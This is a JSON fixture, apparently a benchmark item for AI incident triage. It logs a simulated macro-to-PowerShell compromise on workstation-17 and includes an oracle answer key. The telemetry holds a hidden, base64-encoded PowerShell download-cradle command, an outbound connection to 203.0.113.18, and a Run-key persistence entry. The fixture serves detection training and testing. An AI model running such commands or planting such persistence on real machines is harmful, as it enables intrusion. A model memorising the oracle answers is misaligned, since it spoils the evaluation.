@@ -1,0 +1,198 @@
+{
+  "incident_id": "incident-0042",
+  "name": "Encoded PowerShell on workstation-17",
+  "alert": {
+    "timestamp": "2026-07-10T14:23:11Z",
+    "host": "workstation-17",
+    "user": "analyst-user",
+    "alert_type": "suspicious_powershell",
+    "summary": "Encoded PowerShell execution detected on workstation-17"
+  },
+  "scope": {
+    "allowed_log_sources": ["process_events", "powershell", "network", "file", "registry"],
+    "start": "2026-07-10T14:00:00Z",
+    "end": "2026-07-10T15:00:00Z",
+    "hosts": ["workstation-17"]
+  },
+  "telemetry": {
+    "process_events": [
+      {
+        "event_id": "event-1008",
+        "timestamp": "2026-07-10T14:21:02Z",
+        "host": "workstation-17",
+        "user": "analyst-user",
+        "process_name": "chrome.exe",
+        "pid": 4412,
+        "parent_process_name": "explorer.exe",
+        "parent_pid": 2188,
+        "command_line": "chrome.exe"
+      },
+      {
+        "event_id": "event-1019",
+        "timestamp": "2026-07-10T14:22:58Z",
+        "host": "workstation-17",
+        "user": "analyst-user",
+        "process_name": "WINWORD.EXE",
+        "pid": 5520,
+        "parent_process_name": "explorer.exe",
+        "parent_pid": 2188,
+        "command_line": "WINWORD.EXE C:\\Users\\analyst-user\\Downloads\\Q3-review.docm"
+      },
+      {
+        "event_id": "event-1021",
+        "timestamp": "2026-07-10T14:23:11Z",
+        "host": "workstation-17",
+        "user": "analyst-user",
+        "process_name": "powershell.exe",
+        "pid": 6744,
+        "parent_process_name": "WINWORD.EXE",
+        "parent_pid": 5520,
+        "command_line": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA"
+      },
+      {
+        "event_id": "event-1028",
+        "timestamp": "2026-07-10T14:23:18Z",
+        "host": "workstation-17",
+        "user": "analyst-user",
+        "process_name": "powershell.exe",
+        "pid": 6901,
+        "parent_process_name": "powershell.exe",
+        "parent_pid": 6744,
+        "command_line": "powershell.exe -file C:\\Users\\analyst-user\\AppData\\Local\\Temp\\update.ps1"
+      }
+    ],
+    "network": [
+      {
+        "event_id": "event-1024",
+        "timestamp": "2026-07-10T14:23:19Z",
+        "host": "workstation-17",
+        "user": "analyst-user",
+        "process_name": "powershell.exe",
+        "pid": 6744,
+        "destination_ip": "203.0.113.18",
+        "destination_port": 443,
+        "protocol": "tls",
+        "bytes_out": 18432
+      },
+      {
+        "event_id": "event-1009",
+        "timestamp": "2026-07-10T14:21:10Z",
+        "host": "workstation-17",
+        "user": "analyst-user",
+        "process_name": "chrome.exe",
+        "pid": 4412,
+        "destination_ip": "142.250.72.14",
+        "destination_port": 443,
+        "protocol": "tls",
+        "bytes_out": 4096
+      }
+    ],
+    "file": [
+      {
+        "event_id": "event-1026",
+        "timestamp": "2026-07-10T14:23:17Z",
+        "host": "workstation-17",
+        "user": "analyst-user",
+        "process_name": "powershell.exe",
+        "pid": 6744,
+        "action": "write",
+        "path": "C:\\Users\\analyst-user\\AppData\\Local\\Temp\\update.ps1",
+        "sha256": "a3f1c8e0b21d44aa90c1e6f7ab991200"
+      }
+    ],
+    "registry": [
+      {
+        "event_id": "event-1033",
+        "timestamp": "2026-07-10T14:23:41Z",
+        "host": "workstation-17",
+        "user": "analyst-user",
+        "process_name": "powershell.exe",
+        "pid": 6901,
+        "action": "set_value",
+        "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "value_name": "Updater",
+        "value_data": "powershell.exe -file C:\\Users\\analyst-user\\AppData\\Local\\Temp\\update.ps1"
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "event-1021",
+      "source": "process_events",
+      "timestamp": "2026-07-10T14:23:11Z",
+      "host": "workstation-17",
+      "fields": {
+        "process_name": "powershell.exe",
+        "parent_process_name": "WINWORD.EXE",
+        "command_line": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA"
+      }
+    },
+    {
+      "event_id": "event-1024",
+      "source": "network",
+      "timestamp": "2026-07-10T14:23:19Z",
+      "host": "workstation-17",
+      "fields": {
+        "destination_ip": "203.0.113.18",
+        "process_name": "powershell.exe"
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "Was PowerShell launched by an approved management process or an office parent?",
+      "tool": "find_process_tree",
+      "arguments": {"host": "workstation-17", "process_or_event_id": "event-1021", "max_depth": 4}
+    },
+    {
+      "order": 2,
+      "question": "Did the same process make an uncommon outbound connection?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "network",
+        "filter": {"host": "workstation-17", "process_name": "powershell.exe"},
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "Was persistence written after execution?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "registry",
+        "filter": {"host": "workstation-17"},
+        "limit": 50
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "analyst-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "process_events",
+          "filter": {"host": "workstation-17", "process_name": "powershell.exe"},
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "network",
+          "filter": {"host": "workstation-17"},
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "How to distinguish encoded PowerShell from approved administration",
+          "corpus_tags": ["detection", "powershell"],
+          "top_k": 3
+        }
+      }
+    ]
+  }
+}
